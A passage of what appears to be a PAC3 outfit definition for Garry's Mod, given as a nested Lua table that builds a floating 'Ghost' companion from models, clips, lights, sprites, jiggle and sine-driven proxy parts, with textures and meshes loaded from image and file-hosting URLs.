														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(0, 90.199996948242, 0),
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = """",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = false,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 1,
												[""DrawOrder""] = 0,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""models/props_combine/metal_combinebridge001"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(170, 148, 148),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, -0.25),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.125,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""models/pac/default.mdl"",
												[""UniqueID""] = ""3773834643"",
											},
										},
										[4] = {
											[""children""] = {
												[1] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3082785085"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""NoTextureFiltering""] = false,
														[""Bone""] = ""head"",
														[""BlendMode""] = """",
														[""Translucent""] = false,
														[""IgnoreZ""] = false,
														[""IsDisturbing""] = false,
														[""Position""] = Vector(-6.103515625e-05, -0.0001068115234375, -23.30029296875),
														[""AimPartUID""] = """",
														[""EyeAngles""] = false,
														[""Hide""] = false,
														[""Name""] = """",
														[""Style""] = 0,
														[""EditorExpand""] = false,
														[""ClassName""] = ""light"",
														[""Size""] = 100,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""Color""] = Vector(81, 191, 255),
														[""AngleOffset""] = Angle(0, 0, 0),
														[""Brightness""] = 0.15000000596046,
														[""Angles""] = Angle(0, 0, 0),
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = ""Flashlight"",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = false,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 1,
												[""DrawOrder""] = 0,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = """",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(157, 218, 253),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0.20000000298023, 0),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(0.30000001192093, 0.30000001192093, 0.30000001192093),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.10000000149012,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""models/effects/vol_light128x384.mdl"",
												[""UniqueID""] = ""647930842"",
											},
										},
									},
									[""self""] = {
										[""Skin""] = 0,
										[""Invert""] = false,
										[""LightBlend""] = 1,
										[""CellShade""] = 0,
										[""AimPartName""] = """",
										[""IgnoreZ""] = false,
										[""AimPartUID""] = """",
										[""Passes""] = 1,
										[""Name""] = """",
										[""Angles""] = Angle(0, 0, 90),
										[""DoubleFace""] = true,
										[""PositionOffset""] = Vector(-0.076516695320606, -0.055104099214077, -0.076516695320606),
										[""BlurLength""] = 0,
										[""OwnerEntity""] = false,
										[""Brightness""] = 1,
										[""DrawOrder""] = 0,
										[""BlendMode""] = """",
										[""TintColor""] = Vector(0, 0, 0),
										[""Alpha""] = 1,
										[""LodOverride""] = -1,
										[""TargetEntityUID""] = """",
										[""BlurSpacing""] = 0,
										[""UsePlayerColor""] = false,
										[""Material""] = ""https://i.imgur.com/BUK5qg0.jpeg"",
										[""UseWeaponColor""] = false,
										[""EyeAngles""] = true,
										[""UseLegacyScale""] = false,
										[""Bone""] = ""head"",
										[""Color""] = Vector(255, 255, 255),
										[""Fullbright""] = false,
										[""BoneMerge""] = false,
										[""IsDisturbing""] = false,
										[""Position""] = Vector(0, 0, 0),
										[""NoTextureFiltering""] = false,
										[""AlternativeScaling""] = false,
										[""Hide""] = false,
										[""Translucent""] = true,
										[""Scale""] = Vector(1, 1, 1),
										[""ClassName""] = ""model"",
										[""EditorExpand""] = true,
										[""Size""] = 0.375,
										[""ModelFallback""] = """",
										[""AngleOffset""] = Angle(-90, 0, 0),
										[""TextureFilter""] = 2,
										[""Model""] = ""https://dl.dropboxusercontent.com/s/1ib833ljd7pveh1/Ghost%20Body.obj?dl=0"",
										[""UniqueID""] = ""1819670032"",
									},
								},
							},
							[""self""] = {
								[""ConstrainRoll""] = false,
								[""UniqueID""] = ""4257471642"",
								[""Speed""] = 10,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""Ground""] = false,
								[""JigglePosition""] = true,
								[""ConstrainY""] = false,
								[""AimPartUID""] = """",
								[""JiggleAngle""] = true,
								[""Name""] = """",
								[""ConstrainSphere""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""ConstantVelocity""] = Vector(0, 0, 0),
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""ConstrainYaw""] = false,
								[""TargetEntityUID""] = """",
								[""StopRadius""] = 0,
								[""Bone""] = ""head"",
								[""ResetOnHide""] = false,
								[""Strain""] = 0.5,
								[""Position""] = Vector(10.166000366211, 1.5210000276566, -11.623000144958),
								[""ConstrainZ""] = false,
								[""Hide""] = false,
								[""LocalVelocity""] = true,
								[""BlendMode""] = """",
								[""EditorExpand""] = true,
								[""Angles""] = Angle(0, 0, 0),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""Translucent""] = false,
								[""ConstrainPitch""] = false,
								[""ClassName""] = ""jiggle"",
								[""ConstrainX""] = false,
							},
						},
						[2] = {
							[""children""] = {
							},
							[""self""] = {
								[""AffectChildrenOnly""] = false,
								[""DrawOrder""] = 0,
								[""TargetPartUID""] = """",
								[""Name""] = """",
								[""Event""] = ""is_flashlight_on"",
								[""Hide""] = false,
								[""TargetEntityUID""] = """",
								[""RootOwner""] = true,
								[""EditorExpand""] = true,
								[""ClassName""] = ""event"",
								[""Arguments""] = """",
								[""Invert""] = true,
								[""IsDisturbing""] = false,
								[""Operator""] = ""find simple"",
								[""UniqueID""] = ""1798839468"",
								[""ZeroEyePitch""] = false,
							},
						},
					},
					[""self""] = {
						[""Skin""] = 0,
						[""Invert""] = false,
						[""LightBlend""] = 1,
						[""CellShade""] = 0,
						[""AimPartName""] = """",
						[""IgnoreZ""] = false,
						[""AimPartUID""] = """",
						[""Passes""] = 1,
						[""Name""] = ""Ghost Follow"",
						[""Angles""] = Angle(0, 0, 0),
						[""DoubleFace""] = false,
						[""PositionOffset""] = Vector(0, 0, 0),
						[""BlurLength""] = 0,
						[""OwnerEntity""] = false,
						[""Brightness""] = 1,
						[""DrawOrder""] = 0,
						[""BlendMode""] = """",
						[""TintColor""] = Vector(0, 0, 0),
						[""Alpha""] = 0,
						[""LodOverride""] = -1,
						[""TargetEntityUID""] = """",
						[""BlurSpacing""] = 0,
						[""UsePlayerColor""] = false,
						[""Material""] = """",
						[""UseWeaponColor""] = false,
						[""EyeAngles""] = false,
						[""UseLegacyScale""] = false,
						[""Bone""] = ""spine 4"",
						[""Color""] = Vector(255, 255, 255),
						[""Fullbright""] = false,
						[""BoneMerge""] = false,
						[""IsDisturbing""] = false,
						[""Position""] = Vector(0, 0, 0),
						[""NoTextureFiltering""] = false,
						[""AlternativeScaling""] = false,
						[""Hide""] = false,
						[""Translucent""] = true,
						[""Scale""] = Vector(1, 1, 1),
						[""ClassName""] = ""model"",
						[""EditorExpand""] = false,
						[""Size""] = 1,
						[""ModelFallback""] = """",
						[""AngleOffset""] = Angle(0, 0, 0),
						[""TextureFilter""] = 3,
						[""Model""] = ""models/pac/default.mdl"",
						[""UniqueID""] = ""2252609760"",
					},
				},
				[2] = {
					[""children""] = {
						[1] = {
							[""children""] = {
								[1] = {
									[""children""] = {
										[1] = {
											[""children""] = {
												[1] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3978458624"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, -0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 45, 2.305188900209e-05),
													},
												},
												[2] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1636610709"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, 0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, -45, 2.305188900209e-05),
													},
												},
												[3] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3998486132"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, -0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 135, 2.305188900209e-05),
													},
												},
												[4] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""593226825"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, 0.44999998807907, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, -135, 2.305188900209e-05),
													},
												},
												[5] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""2325836742"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(-1.444000005722, 0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 0, 2.305188900209e-05),
													},
												},
												[6] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""2020085861"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(1.444000005722, 0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = false,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(6.6594344389159e-05, 180, 2.305188900209e-05),
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = """",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = true,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 20,
												[""DrawOrder""] = -1,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""https://i.imgur.com/sB8t470.jpeg"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(7.6500000953674, 7.6500000953674, 7.6500000953674),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, -0.10400000214577),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.375,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""https://dl.dropboxusercontent.com/s/x6ieklc9tweqeu5/Ghost%20Eye.obj?dl=0"",
												[""UniqueID""] = ""66064867"",
											},
										},
										[2] = {
											[""children""] = {
											},
											[""self""] = {
												[""DrawOrder""] = 0,
												[""UniqueID""] = ""1967422210"",
												[""Axis""] = ""y"",
												[""Input""] = ""time"",
												[""TargetPartUID""] = """",
												[""InputMultiplier""] = 2.0999999046326,
												[""RootOwner""] = false,
												[""TargetEntityUID""] = """",
												[""ZeroEyePitch""] = false,
												[""ClassName""] = ""proxy"",
												[""ResetVelocitiesOnHide""] = true,
												[""VelocityRoughness""] = 10,
												[""Max""] = 2.2000000119209,
												[""Pow""] = 1,
												[""EditorExpand""] = false,
												[""AffectChildren""] = false,
												[""Min""] = -1.1920930048648e-08,
												[""Hide""] = false,
												[""Name""] = """",
												[""VariableName""] = ""PositionOffset"",
												[""Offset""] = 0,
												[""PlayerAngles""] = false,
												[""Additive""] = false,
												[""InputDivider""] = 1,
												[""IsDisturbing""] = false,
												[""OutputTargetPartUID""] = """",
												[""Function""] = ""sin"",
												[""Expression""] = """",
											},
										},
										[3] = {
											[""children""] = {
												[1] = {
													[""children""] = {
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""1565078350"",
														[""TargetEntityUID""] = """",
														[""Alpha""] = 1,
														[""SizeX""] = 3.5,
														[""SizeY""] = 1,
														[""NoTextureFiltering""] = false,
														[""Bone""] = ""head"",
														[""BlendMode""] = """",
														[""Translucent""] = true,
														[""IgnoreZ""] = false,
														[""IsDisturbing""] = false,
														[""Position""] = Vector(0, 0, -1.2999999523163),
														[""AimPartUID""] = """",
														[""AngleOffset""] = Angle(0, 0, 0),
														[""Hide""] = false,
														[""Name""] = """",
														[""AimPartName""] = """",
														[""EditorExpand""] = false,
														[""Angles""] = Angle(0, 0, 0),
														[""Size""] = 5.0500001907349,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""Color""] = Vector(0, 161, 255),
														[""ClassName""] = ""sprite"",
														[""EyeAngles""] = false,
														[""SpritePath""] = ""sprites/light_ignorez"",
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = ""ghost%eye 1"",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = true,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 1,
												[""DrawOrder""] = 0,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""https://i.imgur.com/BUK5qg0_d.jpg?maxwidth=520&shape=thumb&fidelity=high"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(255, 255, 255),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, 0),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = true,
												[""Size""] = 0.375,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""https://dl.dropboxusercontent.com/s/x6ieklc9tweqeu5/Ghost%20Eye.obj?dl=0"",
												[""UniqueID""] = ""1380437341"",
											},
										},
										[4] = {
											[""children""] = {
											},
											[""self""] = {
												[""DrawOrder""] = 0,
												[""UniqueID""] = ""4059383654"",
												[""Axis""] = """",
												[""Input""] = ""time"",
												[""TargetPartUID""] = """",
												[""InputMultiplier""] = 4.8000001907349,
												[""RootOwner""] = false,
												[""TargetEntityUID""] = """",
												[""ZeroEyePitch""] = false,
												[""ClassName""] = ""proxy"",
												[""ResetVelocitiesOnHide""] = true,
												[""VelocityRoughness""] = 10,
												[""Max""] = 0.10000000149012,
												[""Pow""] = 1,
												[""EditorExpand""] = false,
												[""AffectChildren""] = false,
												[""Min""] = -0.10000000149012,
												[""Hide""] = false,
												[""Name""] = """",
												[""VariableName""] = ""PositionOffset"",
												[""Offset""] = 0,
												[""PlayerAngles""] = false,
												[""Additive""] = false,
												[""InputDivider""] = 1,
												[""IsDisturbing""] = false,
												[""OutputTargetPartUID""] = """",
												[""Function""] = ""sin"",
												[""Expression""] = """",
											},
										},
										[5] = {
											[""children""] = {
												[1] = {
													[""children""] = {
														[1] = {
															[""children""] = {
															},
															[""self""] = {
																[""DrawOrder""] = 0,
																[""UniqueID""] = ""4161152628"",
																[""Axis""] = ""y"",
																[""Input""] = ""timeex"",
																[""TargetPartUID""] = """",
																[""InputMultiplier""] = 2.5,
																[""RootOwner""] = false,
																[""TargetEntityUID""] = """",
																[""ZeroEyePitch""] = false,
																[""ClassName""] = ""proxy"",
																[""ResetVelocitiesOnHide""] = true,
																[""VelocityRoughness""] = 10,
																[""Max""] = -1.6000000238419,
																[""Pow""] = 100,
																[""EditorExpand""] = false,
																[""AffectChildren""] = false,
																[""Min""] = 0,
																[""Hide""] = false,
																[""Name""] = """",
																[""VariableName""] = ""Position"",
																[""Offset""] = 2.2000000476837,
																[""PlayerAngles""] = false,
																[""Additive""] = false,
																[""InputDivider""] = 1,
																[""IsDisturbing""] = false,
																[""OutputTargetPartUID""] = """",
																[""Function""] = ""sin"",
																[""Expression""] = """",
															},
														},
													},
													[""self""] = {
														[""DrawOrder""] = 0,
														[""UniqueID""] = ""3172140641"",
														[""TargetEntityUID""] = """",
														[""AimPartName""] = """",
														[""Bone""] = ""head"",
														[""Position""] = Vector(0, -0, 0),
														[""AimPartUID""] = """",
														[""Hide""] = false,
														[""Name""] = """",
														[""Translucent""] = false,
														[""AngleOffset""] = Angle(0, 0, 0),
														[""EditorExpand""] = true,
														[""PositionOffset""] = Vector(0, 0, 0),
														[""IsDisturbing""] = false,
														[""ClassName""] = ""clip"",
														[""EyeAngles""] = false,
														[""Angles""] = Angle(0, 90.199996948242, 0),
													},
												},
											},
											[""self""] = {
												[""Skin""] = 0,
												[""Invert""] = false,
												[""LightBlend""] = 1,
												[""CellShade""] = 0,
												[""AimPartName""] = """",
												[""IgnoreZ""] = false,
												[""AimPartUID""] = """",
												[""Passes""] = 1,
												[""Name""] = """",
												[""Angles""] = Angle(0, 0, 0),
												[""DoubleFace""] = false,
												[""PositionOffset""] = Vector(0, 0, 0),
												[""BlurLength""] = 0,
												[""OwnerEntity""] = false,
												[""Brightness""] = 0.69999998807907,
												[""DrawOrder""] = 0,
												[""BlendMode""] = """",
												[""TintColor""] = Vector(0, 0, 0),
												[""Alpha""] = 1,
												[""LodOverride""] = -1,
												[""TargetEntityUID""] = """",
												[""BlurSpacing""] = 0,
												[""UsePlayerColor""] = false,
												[""Material""] = ""models/props_combine/metal_combinebridge001"",
												[""UseWeaponColor""] = false,
												[""EyeAngles""] = false,
												[""UseLegacyScale""] = false,
												[""Bone""] = ""head"",
												[""Color""] = Vector(255, 255, 255),
												[""Fullbright""] = false,
												[""BoneMerge""] = false,
												[""IsDisturbing""] = false,
												[""Position""] = Vector(0, 0, -0.25),
												[""NoTextureFiltering""] = false,
												[""AlternativeScaling""] = false,
												[""Hide""] = false,
												[""Translucent""] = true,
												[""Scale""] = Vector(1, 1, 1),
												[""ClassName""] = ""model"",
												[""EditorExpand""] = false,
												[""Size""] = 0.125,
												[""ModelFallback""] = """",
												[""AngleOffset""] = Angle(0, 0, 0),
												[""TextureFilter""] = 3,
												[""Model""] = ""models/pac/default.mdl"",
												[""UniqueID""] = ""3144118116"",
											},
										},
										[6] = {
											[""children""] = {
											},
											[""self""] = {
												[""DrawOrder""] = 0,
												[""UniqueID""] = ""554825209"",
												[""Axis""] = ""z"",
												[""Input""] = ""time"",
												[""TargetPartUID""] = """",
												[""InputMultiplier""] = 4.8000001907349,
												[""RootOwner""] = false,
												[""TargetEntityUID""] = """",
												[""ZeroEyePitch""] = false,
												[""ClassName""] = ""proxy"",
												[""ResetVelocitiesOnHide""] = true,
												[""VelocityRoughness""] = 10,
												[""Max""] = -0.5,
												[""Pow""] = 1,
												[""EditorExpand""] = false,
												[""AffectChildren""] = false,
												[""Min""] = -0.10000000149012,
												[""Hide""] = false,
												[""Name""] = ""ghost%body.positionoffset.z = -0.01"",
												[""VariableName""] = ""PositionOffset"",
												[""Offset""] = 0,
												[""PlayerAngles""] = false,
												[""Additive""] = false,
												[""InputDivider""] = 1,
												[""IsDisturbing""] = false,
												[""OutputTargetPartUID""] = """",
												[""Function""] = ""sin"",
												[""Expression""] = """",
											},
										},
									},
									[""self""] = {
										[""Skin""] = 0,
										[""Invert""] = false,
										[""LightBlend""] = 1,
										[""CellShade""] = 0,
										[""AimPartName""] = """",
										[""IgnoreZ""] = false,
										[""AimPartUID""] = """",
										[""Passes""] = 1,
										[""Name""] = """",
										[""Angles""] = Angle(0, 0, 90),
										[""DoubleFace""] = true,
										[""PositionOffset""] = Vector(-0.026826847344637, 0.7591712474823, -0.24634630978107),
										[""BlurLength""] = 0,
										[""OwnerEntity""] = false,
										[""Brightness""] = 1,
										[""DrawOrder""] = 0,
										[""BlendMode""] = """",
										[""TintColor""] = Vector(0, 0, 0),
										[""Alpha""] = 1,
										[""LodOverride""] = -1,
										[""TargetEntityUID""] = """",
										[""BlurSpacing""] = 0,
										[""UsePlayerColor""] = false,
										[""Material""] = ""https://i.imgur.com/BUK5qg0.jpeg"",
										[""UseWeaponColor""] = false,
										[""EyeAngles""] = true,
										[""UseLegacyScale""] = false,
										[""Bone""] = ""head"",
										[""Color""] = Vector(255, 255, 255),
										[""Fullbright""] = false,
										[""BoneMerge""] = false,
										[""IsDisturbing""] = false,
										[""Position""] = Vector(0, 0, 0),
										[""NoTextureFiltering""] = false,
										[""AlternativeScaling""] = false,
										[""Hide""] = false,
										[""Translucent""] = true,
										[""Scale""] = Vector(1, 1, 1),
										[""ClassName""] = ""model"",
										[""EditorExpand""] = true,
										[""Size""] = 0.375,
										[""ModelFallback""] = """",
										[""AngleOffset""] = Angle(-90, 0, 0),
										[""TextureFilter""] = 2,
										[""Model""] = ""https://dl.dropboxusercontent.com/s/1ib833ljd7pveh1/Ghost%20Body.obj?dl=0"",
										[""UniqueID""] = ""1840765594"",
									},
								},
							},
							[""self""] = {
								[""ConstrainRoll""] = false,
								[""UniqueID""] = ""2797392960"",
								[""Speed""] = 10,
								[""AimPartName""] = """",
								[""IgnoreZ""] = false,
								[""Ground""] = false,
								[""JigglePosition""] = true,
								[""ConstrainY""] = false,
								[""AimPartUID""] = """",
								[""JiggleAngle""] = true,
								[""Name""] = """",
								[""ConstrainSphere""] = 0,
								[""NoTextureFiltering""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""IsDisturbing""] = false,
								[""ConstantVelocity""] = Vector(0, 0, 0),
								[""EyeAngles""] = false,
								[""DrawOrder""] = 0,
								[""ConstrainYaw""] = false,
								[""TargetEntityUID""] = """",
								[""StopRadius""] = 0,
								[""Bone""] = ""head"",
								[""ResetOnHide""] = false,
								[""Strain""] = 0.5,
								[""Position""] = Vector(10.166000366211, 1.5210000276566, -11.623000144958),
								[""ConstrainZ""] = false,
								[""Hide""] = false,
								[""LocalVelocity""] = true,
								[""BlendMode""] = """",
								[""EditorExpand""] = true,
								[""Angles""] = Angle(0, 0, 0),
								[""AngleOffset""] = Angle(0, 0, 0),
								[""Translucent""] = false,
								[""ConstrainPitch""] = false,
								[""ClassName""] = ""jiggle"",
								[""ConstrainX""] = false,
							},
						},
						[2] = {
							[""children""] = {
							},
							[""self""] = {
								[""AffectChildrenOnly""] = false,
								[""DrawOrder""] = 0,
								[""TargetPartUID""] = """",
								[""Name""] = """",
								[""Event""] = ""is_flashlight_on"",
								[""Hide""] = false,
								[""TargetEntityUID""] = """",
								[""RootOwner""] = true,
								[""EditorExpand""] = true,
								[""ClassName""] = ""event"",
								[""Arguments""] = """",
								[""Invert""] = false,
								[""IsDisturbing""] = false,
								[""Operator""] = ""find simple"",
								[""UniqueID""] = ""2193679100"",
								[""ZeroEyePitch""] = false,
							},
						},
					},
					[""self""] = {
						[""Skin""] = 0,
						[""Invert""] = false,
						[""LightBlend""] = 1,
						[""CellShade""] = 0,
						[""AimPartName""] = """",
						[""IgnoreZ""] = false,
						[""AimPartUID""] = """",
						[""Passes""] = 1,
						[""Name""] = ""Ghost Follow Flashlight off"",
						[""Angles""] = Angle(0, 0, 0),
						[""DoubleFace""] = false,
						[""PositionOffset""] = Vector(0, 0, 0),
						[""BlurLength""] = 0,
						[""OwnerEntity""] = false,
						[""Brightness""] = 1,
						[""DrawOrder""] = 0,
						[""BlendMode""] = """",
						[""TintColor""] = Vector(0, 0, 0),
						[""Alpha""] = 0,
						[""LodOverride""] = -1,
						[""TargetEntityUID""] = """",
						[""BlurSpacing""] = 0,
						[""UsePlayerColor""] = false,
						[""Material""] = """",
						[""UseWeaponColor""] = false,
						[""EyeAngles""] = false,
						[""UseLegacyScale""] = false,
						[""Bone""] = ""spine 4"",
						[""Color""] = Vector(255, 255, 255),
						[""Fullbright""] = false,
						[""BoneMerge""] = false,
						[""IsDisturbing""] = false,
						[""Position""] = Vector(0, 0, 0),
						[""NoTextureFiltering""] = false,
						[""AlternativeScaling""] = false,
						[""Hide""] = false,
						[""Translucent""] = true,
						[""Scale""] = Vector(1, 1, 1),
						[""ClassName""] = ""model"",
						[""EditorExpand""] = false,
						[""Size""] = 1,
						[""ModelFallback""] = """",
						[""AngleOffset""] = Angle(0, 0, 0),
						[""TextureFilter""] = 3,
						[""Model""] = ""models/pac/default.mdl"",
						[""UniqueID""] = ""680004608"",
					},
				},
			},
			[""self""] = {
				[""DrawOrder""] = 0,
				[""UniqueID""] = ""1899629946"",
				[""Hide""] = false,
				[""TargetEntityUID""] = """",
				[""EditorExpand""] = true,
				[""OwnerName""] = ""self"",
				[""IsDisturbing""] = false,
				[""Name""] = ""Ghost"",
				[""Duplicate""] = false,
				[""ClassName""] = ""group"",
			},
		},
	},
	[""self""] = {
		[""DrawOrder""] = 0,
		[""UniqueID""] = ""1976598905"",
		[""Hide""] = false,
		[""TargetEntityUID""] = """",
		[""EditorExpand""] = true,
